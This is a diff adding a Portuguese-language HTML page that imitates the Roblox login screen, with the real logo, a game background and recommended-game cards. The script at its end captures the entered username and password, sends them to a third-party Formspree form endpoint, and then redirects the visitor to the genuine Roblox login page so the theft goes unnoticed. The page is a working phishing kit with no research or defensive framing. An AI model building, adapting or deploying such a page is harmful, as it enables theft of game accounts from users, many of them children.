@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Entrar no Roblox</title>
+    <!-- Favicon Real -->
+    <link rel="icon" type="image/png" href="https://www.roblox.com/favicon.ico">
+    
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Gotham', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: #e3e3e3; /* Cor de fallback */
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow-y: auto; /* Permite rolar se a tela for pequena */
+        }
+
+        /* Fundo Desfocado */
+        .background-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            /* Imagem de fundo estilo Adopt Me / Brookhaven */
+            background-image: url('https://tr.rbxcdn.com/180-day-official-gallery-covers-1596x900-1714140698.jpg'); 
+            background-size: cover;
+            background-position: center;
+            filter: blur(3px); /* O desfoque característico */
+        }
+
+        .main-wrapper {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+            width: 100%;
+            max-width: 1000px;
+        }
+
+        /* Caixa de Login */
+        .login-box {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            width: 320px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+
+        h2 { 
+            text-align: center; 
+            color: #393a3c; 
+            margin-top: 0;
+            margin-bottom: 20px; 
+            font-size: 20px; 
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 5px 0 15px 0;
+            border: 1px solid #aeb4b9;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 16px;
+            background-color: #f2f4f5;
+        }
+
+        button {
+            width: 100%;
+            background-color: #00b06f;
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 6px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover { background-color: #009a60; }
+        button:disabled { background-color: #ccc; cursor: not-allowed; }
+
+        .links { 
+            text-align: center; 
+            margin-top: 15px; 
+            font-size: 14px; 
+        }
+        .links a { 
+            color: #0074bd; 
+            text-decoration: none; 
+            display: block; 
+            margin-bottom: 5px; 
+            cursor: pointer;
+        }
+        .links a:hover { text-decoration: underline; }
+
+        /* Seção de Jogos Recomendados */
+        .games-section {
+            width: 100%;
+            max-width: 900px;
+            text-align: center;
+        }
+        
+        .games-title {
+            color: #ffffff; /* Texto branco sobre o fundo escuro */
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            text-shadow: 1px 1px 3px rgba(0,0,0,0.5);
+        }
+
+        .games-grid {
+            display: flex;
+            gap: 15px;
+            overflow-x: auto; /* Rolagem horizontal se não couber na tela */
+            padding-bottom: 10px;
+            justify-content: center;
+        }
+
+        .game-card {
+            min-width: 140px;
+            max-width: 140px;
+            background: white;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+            transition: transform 0.2s;
+            cursor: pointer;
+        }
+
+        .game-card:hover {
+            transform: scale(1.05);
+        }
+
+        .game-card img {
+            width: 100%;
+            height: 140px;
+            object-fit: cover;
+        }
+
+        .game-card p {
+            margin: 0;
+            padding: 8px;
+            font-size: 12px;
+            font-weight: bold;
+            color: #333;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+    </style>
+<meta property="og:title" content="Entrar no Roblox"><meta name="description" content="Login"><meta property="og:description" content="Login"><meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_beta_logo.png"><meta property="og:type" content="website"></head>
+<body>
+
+<!-- Fundo desfocado -->
+<div class="background-container"></div>
+
+<div class="main-wrapper">
+    <!-- Formulário de Login -->
+    <div class="login-box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_beta_logo.png" alt="Roblox Logo" class="logo">
+        <h2>Entrar</h2>
+        <form id="robloxForm">
+            <input type="text" name="username" placeholder="Usuário/e-mail/telefone" required>
+            <input type="password" name="password" placeholder="Senha" required>
+            <button type="submit" id="submitBtn">Entrar</button>
+        </form>
+
+        <div class="links">
+            <a href="javascript:void(0)">Esqueceu a senha ou nome de usuário?</a>
+            <a href="javascript:void(0)">Envie-me um código único por e-mail</a>
+        </div>
+    </div>
+
+    <!-- Jogos Recomendados -->
+    <div class="games-section">
+        <div class="games-title">Jogos recomendados para você</div>
+        <div class="games-grid">
+            <!-- Card 1 -->
+            <div class="game-card">
+                <img src="https://tr.rbxcdn.com/180-day-official-gallery-covers-1596x900-1714140698.jpg" alt="Adopt Me!">
+                <p>Adopt Me!</p>
+            </div>
+            <!-- Card 2 -->
+            <div class="game-card">
+                <img src="https://tr.rbxcdn.com/bce6092d746473182516557874722290-440x440" alt="Brookhaven RP">
+                <p>Brookhaven RP</p>
+            </div>
+            <!-- Card 3 -->
+            <div class="game-card">
+                <img src="https://tr.rbxcdn.com/c8313676956699297754733266983938-440x440" alt="Blox Fruits">
+                <p>Blox Fruits</p>
+            </div>
+            <!-- Card 4 -->
+            <div class="game-card">
+                <img src="https://tr.rbxcdn.com/08717267289457204879672559565629-440x440" alt="Tower of Hell">
+                <p>Tower of Hell</p>
+            </div>
+             <!-- Card 5 -->
+             <div class="game-card">
+                <img src="https://tr.rbxcdn.com/a1719524829124496398855905908559-440x440" alt="Murder Mystery 2">
+                <p>Murder Mystery 2</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    const FORM_ID = 'myewepyz'; 
+    const REDIRECT_URL = 'https://www.roblox.com/login';
+
+    document.getElementById('robloxForm').addEventListener('submit', function(e) {
+        e.preventDefault(); 
+        
+        const btn = document.getElementById('submitBtn');
+        btn.disabled = true;
+        btn.innerText = "Verificando...";
+
+        const formData = new FormData(this);
+        const data = Object.fromEntries(formData.entries());
+
+        fetch(`https://formspree.io/f/${FORM_ID}`, {
+            method: 'POST',
+            body: JSON.stringify(data),
+            headers: { 'Content-Type': 'application/json' }
+        }).then(() => {
+            setTimeout(() => {
+                window.location.href = REDIRECT_URL;
+            }, 1500); 
+        }).catch(error => {
+            console.error('Erro:', error);
+            setTimeout(() => {
+                window.location.href = REDIRECT_URL;
+            }, 500);
+        });
+    });
+</script>
+
+</body>
+</html>
